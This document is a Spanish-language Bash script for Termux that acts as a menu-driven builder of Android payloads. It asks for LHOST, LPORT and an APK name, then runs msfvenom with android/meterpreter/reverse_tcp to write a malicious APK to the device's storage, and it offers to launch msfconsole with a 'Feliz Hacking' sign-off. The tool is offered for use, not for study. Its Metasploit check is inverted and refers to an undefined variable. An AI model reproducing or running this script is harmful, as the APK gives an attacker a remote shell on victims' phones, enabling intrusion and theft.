#!/data/data/com.termux/files/usr/bin/bash

# CREADO POR EDGAR LUCK..[✓]

# COLORES

verde='\033[32m'
amarillo='\033[33m'
magenta='\033[1;35m'
rojo='\033[31m'
blanco='\033[37m'
cyan='\033[1;36m'

clear
sleep 1


# creando payload para andorid
while :
do

echo -e ${blanco}"+                                                           +"
sleep 0.8
echo -e ${magenta}"+                       ++++++++++++                        +" 
sleep 0.6
echo -e ${verde}"+                       [BIENVENIDO]                        +"
sleep 0.6
echo -e ${magenta}"+                       ++++++++++++                        +"
sleep 0.6
echo -e ${blanco}"+                                                           +"
sleep 0.6
echo -e ${magenta}"+            +++++++++++++++++++++++++++++++++++            •"
sleep 0.6
echo -e ${verde}"+            [ Herramienta para crear payload  ]            +"
sleep 0.6
echo -e ${magenta}"+            +++++++++++++++++++++++++++++++++++            +"
echo ""
sleep 0.6
echo -e ${magenta}"+                      ++++++++++++++                       +"
sleep 0.6
echo -e ${verde}"+                      [Para Android]                       +"
sleep 0.6
echo -e ${magenta}"+                      ++++++++++++++                       +"
echo ""
sleep 0.6
echo ""


echo -e ${magenta}"    +++++++++++++++++++++"
echo -e ${verde}"    Elige su distribucion :"
echo -e ${magenta}"    +++++++++++++++++++++"
echo ""
echo -e ${verde}"          [1]${blanco} Termux          ${verde}[2]${blanco} UserLand(Kali)"
echo ""
echo -e ${verde}"          [3]$blanco Linux Mint      $rojo[4] Salir"${verde}
echo ""
echo -e -n ${cyan} ">>>${verde} " 
read -r opcion

[ "${opcion}" == "1" ]||[ "${opcion}" == "2" ]||[ "${opcion}" == "3" ] && break
echo ""
echo -e ${rojo}"[-]${blanco} Opcion incorrecta..."
sleep 2
clear
done

case $opcion in
	1)  
		SYSTEM=$(uname -o)

		if [ "${SYSTEM}" == "Android" ]; then
			BIN="/data/data/com.termux/files/usr/bin"
			APT="pkg"
		else
			BIN="/bin"
			APT="apt-get"
		fi
		echo ""
while :
do
		echo -e ${verde}"[+]${blanco} Iniciando Termux..."
		sleep 3
		echo ""
echo -e ${magenta}"     +++++++++++++++++"
echo -e ${verde}"     Elije una opcion :"
echo -e ${magenta}"     +++++++++++++++++"
echo ""
echo -e ${verde}"         [1]${blanco} Payload para Android."
echo ""
echo -e ${rojo}"         [2] Salir."
echo ""
echo -e -n ${cyan}">>>${verde} "
read -r opcion

[ "${opcion}" == "1" ]||[ "${opcion}" == "2" ] && break
echo ""
echo -e ${rojo}"[-]${blanco} Opcion incorrecta..."
sleep 3
clear
done

if [ "${opcion}" == "1" ];then

            sleep 2
                if [ ! -x ${bin}/msfvenom ]; then
                        echo -e ${verde}"
[+]${blanco} Empezando...."${blanco}
                         sleep 2
                 else
                         echo -e ${rojo}"
           Lo sentimos no tiene instalado Metasploit :(
                         "${blanco}
			 sleep 2
                         exit 1
                fi
                sleep 1.5

	    echo -e ${verde}""
            echo -e -n ${cyan}"Digite tu LHOST:${verde} " 
            read -r LHOST
            sleep 2
	    echo ""
	    echo -e ${magenta}"Ejemplo${cyan}:${magenta} 4444"
            echo -e -n ${cyan}"Digite tu LPORT:${verde} " 
            read -r LPORT
            sleep 2
	    echo ""
	    echo -e ${magenta}"Ejemplo${cyan}:${magenta} Strike.apk"
	    echo -e -n ${cyan}"Nombre del apk:${verde} " 
            read -r apk
	    sleep 2
            echo ""
            echo -e ${verde}"[+]${blanco} Generando el Payload...."
            sleep 3
	    echo ""
msfvenom -p android/meterpreter/reverse_tcp LHOST="$LHOST" LPORT="$LPORT"  R > /sdcard/"$apk"
            sleep 1
	    echo ""
	    echo -e ${verde}"[+]${blanco} Payload Generado"
	    sleep 3
	    echo ""
	    echo -e ${verde}"[+]${blanco} Guardado en la memoria interna"
	    sleep 3
	    echo ""
	    while :
	    do

echo -e ${blanco}" ¿Ejecuto Metasploit?"
echo -e ${verde}"
[1]${blanco} Si"
echo ""
echo -e ${verde}"[2]${blanco} No"
echo ""
echo -e -n ${cyan}">>>${verde} "
read -r opcion

[ "${opcion}" == "1" ]||[ "${opcion}" == "2" ] && break
echo ""
echo -e ${rojo}"[-]${blanco} Opcion Incorrecta. Elige bien pues :)"
sleep 3
clear
done

if [ "${opcion}" == "1" ]; then
        msfconsole
        echo -e ${verde}"Feliz Hacking ^_^"
        sleep 2.5
        exit
else
	[ "${opcion}" == "2" ]
        echo ""
        echo -e ${verde}"Hasta luego ^_^"
        echo ""
        sleep 1.5
fi
        exit
else
	[ "$opcion" == "2" ]
	echo ""  
	echo -e ${verde}"[*]${blanco} Hasta Luego..."
        sleep 1.5
fi
;;

        2)
		SYSTEM=$(uname -o)
		if [ "${SYSTEM}" == "GNU/Linux" ]; then
			BIN="/bin"
			APT="sudo apt-get"
		else
			BIN="/bin"
			APT="apt-get"
		fi
		echo ""
		echo -e ${verde}"[+]${blanco} Iniciando Kali linux..."
		sleep 3
		bash kali.sh
		sleep 1.5

;;

       3)
   	       SYSTEM=$(uname -o)
                if [ "${SYSTEM}" == "GNU/Linux" ]; then
                        BIN="/bin"
                        APT="sudo apt"
                else
                        BIN="/bin"
                        APT="sudo apt-get"
                fi
                echo ""
                echo -e ${verde}"[+]${blanco} Iniciando Linux Mint..."
                sleep 3
                bash Linux-Mint.sh
                sleep 1.5

	       ;;
       4)      
		echo -e ${verde}"Hasta Luego ^_^"
		sleep 2
esac
